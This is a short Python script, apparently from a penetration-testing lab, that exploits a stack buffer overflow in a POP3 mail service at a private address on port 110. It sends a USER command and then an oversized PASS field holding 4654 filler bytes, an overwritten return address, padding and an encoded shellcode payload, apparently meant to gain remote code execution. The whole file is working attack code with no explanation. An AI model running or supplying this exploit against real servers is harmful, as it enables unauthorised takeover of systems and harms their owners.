#!/usr/bin/python

import socket
import os
import sys
from struct import pack

host="10.0.2.7"
port=110

shell = ("\xdd\xc1\xd9\x74\x24\xf4\xbd\xfd\xad\xa4\xb6\x5f\x31\xc9\xb1"
"\x52\x31\x6f\x17\x83\xc7\x04\x03\x92\xbe\x46\x43\x90\x29\x04"
"\xac\x68\xaa\x69\x24\x8d\x9b\xa9\x52\xc6\x8c\x19\x10\x8a\x20"
"\xd1\x74\x3e\xb2\x97\x50\x31\x73\x1d\x87\x7c\x84\x0e\xfb\x1f"
"\x06\x4d\x28\xff\x37\x9e\x3d\xfe\x70\xc3\xcc\x52\x28\x8f\x63"
"\x42\x5d\xc5\xbf\xe9\x2d\xcb\xc7\x0e\xe5\xea\xe6\x81\x7d\xb5"
"\x28\x20\x51\xcd\x60\x3a\xb6\xe8\x3b\xb1\x0c\x86\xbd\x13\x5d"
"\x67\x11\x5a\x51\x9a\x6b\x9b\x56\x45\x1e\xd5\xa4\xf8\x19\x22"
"\xd6\x26\xaf\xb0\x70\xac\x17\x1c\x80\x61\xc1\xd7\x8e\xce\x85"
"\xbf\x92\xd1\x4a\xb4\xaf\x5a\x6d\x1a\x26\x18\x4a\xbe\x62\xfa"
"\xf3\xe7\xce\xad\x0c\xf7\xb0\x12\xa9\x7c\x5c\x46\xc0\xdf\x09"
"\xab\xe9\xdf\xc9\xa3\x7a\xac\xfb\x6c\xd1\x3a\xb0\xe5\xff\xbd"
"\xb7\xdf\xb8\x51\x46\xe0\xb8\x78\x8d\xb4\xe8\x12\x24\xb5\x62"
"\xe2\xc9\x60\x24\xb2\x65\xdb\x85\x62\xc6\x8b\x6d\x68\xc9\xf4"
"\x8e\x93\x03\x9d\x25\x6e\xc4\xa8\xb9\x72\x10\xc5\xbb\x72\x09"
"\xd4\x35\x94\x43\xc6\x13\x0f\xfc\x7f\x3e\xdb\x9d\x80\x94\xa6"
"\x9e\x0b\x1b\x57\x50\xfc\x56\x4b\x05\x0c\x2d\x31\x80\x13\x9b"
"\x5d\x4e\x81\x40\x9d\x19\xba\xde\xca\x4e\x0c\x17\x9e\x62\x37"
"\x81\xbc\x7e\xa1\xea\x04\xa5\x12\xf4\x85\x28\x2e\xd2\x95\xf4"
"\xaf\x5e\xc1\xa8\xf9\x08\xbf\x0e\x50\xfb\x69\xd9\x0f\x55\xfd"
"\x9c\x63\x66\x7b\xa1\xa9\x10\x63\x10\x04\x65\x9c\x9d\xc0\x61"
"\xe5\xc3\x70\x8d\x3c\x40\x90\x6c\x94\xbd\x39\x29\x7d\x7c\x24"
"\xca\xa8\x43\x51\x49\x58\x3c\xa6\x51\x29\x39\xe2\xd5\xc2\x33"
"\x7b\xb0\xe4\xe0\x7c\x91")

buffer = "A" * 4654 + pack("<L", 0x5f4a358f) + "\x83\xEC\x10" * 16  + shell


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send("USER PuffGT\r\n")
s.recv(1024)
s.send("PASS " + buffer + '\r\n')
s.recv(1024)
s.close()
